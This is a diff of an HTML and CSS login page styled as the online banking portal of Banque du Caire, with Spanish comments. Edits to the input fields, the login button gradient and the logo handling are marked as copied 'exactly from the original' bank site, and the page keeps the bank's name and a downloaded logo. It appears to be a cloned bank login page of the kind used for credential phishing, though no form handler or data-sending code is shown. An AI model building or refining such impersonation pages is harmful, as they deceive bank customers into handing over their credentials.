@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Banque du Caire - Banca en Línea</title>
+    <title>BDC Bank - Banca en Línea</title>
     <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
-    <!-- Font Awesome -->
+    <!-- Font Awesome (íconos) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ===== RESET ===== */
+        /* ===== ESTILOS EXTRAÍDOS DEL ORIGINAL ===== */
         * {
             margin: 0;
             padding: 0;
@@ -32,7 +32,7 @@
             overflow: hidden;
         }
 
-        /* ===== HEADER SUPERIOR (ATM, Help, etc.) ===== */
+        /* ===== TOP BAR (ATM, Help, Support, Árabe) ===== */
         .top-bar {
             background: #f8faff;
             padding: 8px 40px;
@@ -56,7 +56,7 @@
             direction: rtl;
         }
 
-        /* ===== HEADER PRINCIPAL ===== */
+        /* ===== HEADER ===== */
         .header {
             background: #ffffff;
             padding: 15px 40px;
@@ -90,7 +90,7 @@
             color: #0056a7;
         }
 
-        /* ===== HERO / LOGIN ===== */
+        /* ===== HERO / LOGIN (estilos exactos del original) ===== */
         .hero {
             background: linear-gradient(135deg, #f8faff 0%, #eef4f9 100%);
             padding: 50px 40px;
@@ -116,7 +116,7 @@
             margin-bottom: 28px;
         }
 
-        /* FORMULARIO */
+        /* FORMULARIO (estilos extraídos del original) */
         .login-box {
             background: #ffffff;
             border-radius: 12px;
@@ -131,12 +131,14 @@
             color: #1a2b4a;
             margin-bottom: 4px;
         }
+        /* Campos de entrada - ESTILO EXACTO DEL ORIGINAL */
         .login-box input {
             width: 100%;
             padding: 10px 12px;
-            border: 1px solid #dce1e8;
-            border-radius: 6px;
-            font-size: 14px;
+            border: solid 1px #8b8b8b !important;
+            border-radius: 10px !important;
+            font-size: 15px !important;
+            color: #000 !important;
             margin-bottom: 18px;
             background: #fafbfc;
             transition: 0.2s;
@@ -146,6 +148,9 @@
             border-color: #1a2b4a;
             background: #ffffff;
             box-shadow: 0 0 0 3px rgba(26,43,74,0.1);
+        }
+        .login-box input::placeholder {
+            color: #b6b6b6 !important;
         }
         .login-box .actions {
             display: flex;
@@ -160,20 +165,22 @@
         .login-box .actions a:hover {
             text-decoration: underline;
         }
+        /* BOTÓN DE LOGIN - GRADIENTE ROJO-NARANJA EXACTO DEL ORIGINAL */
         .btn-login {
             width: 100%;
             padding: 12px;
-            background: #1a2b4a;
-            color: white;
-            border: none;
-            border-radius: 6px;
+            background: linear-gradient(to right, #ef4230 0%, #f26131 48%, #f68b33 97%) !important;
+            border: 0px solid rgba(255, 255, 255, 0.0) !important;
+            border-radius: 10px !important;
+            color: #ffffff !important;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: 0.2s;
+            outline: 0 !important;
         }
         .btn-login:hover {
-            background: #0f1e33;
+            opacity: 0.9;
         }
 
         /* IMAGEN DERECHA */
@@ -379,7 +386,7 @@
 
 <div class="container">
 
-    <!-- ===== TOP BAR (ATM, Help, Support, Árabe) ===== -->
+    <!-- ===== TOP BAR ===== -->
     <div class="top-bar">
         <a href="#"><i class="fas fa-map-marker-alt"></i> ATM &amp; Branch Locator</a>
         <a href="#"><i class="fas fa-question-circle"></i> Help &amp; Support</a>
@@ -389,6 +396,7 @@
     <!-- ===== HEADER ===== -->
     <header class="header">
         <div class="logo">
+            <!-- Tu logo descargado -->
             <img src="assets/img/logo-bdc.png" alt="Banque du Caire" onerror="this.style.display='none'">
             <h1>Banque du Caire</h1>
         </div>
@@ -433,7 +441,6 @@
             <button class="btn-learn">Learn More</button>
         </div>
         <div class="edge-image">
-            <!-- Puedes poner una imagen decorativa; si no, se oculta -->
             <img src="assets/img/edge-image.png" alt="Edge" onerror="this.style.display='none'">
         </div>
     </section>
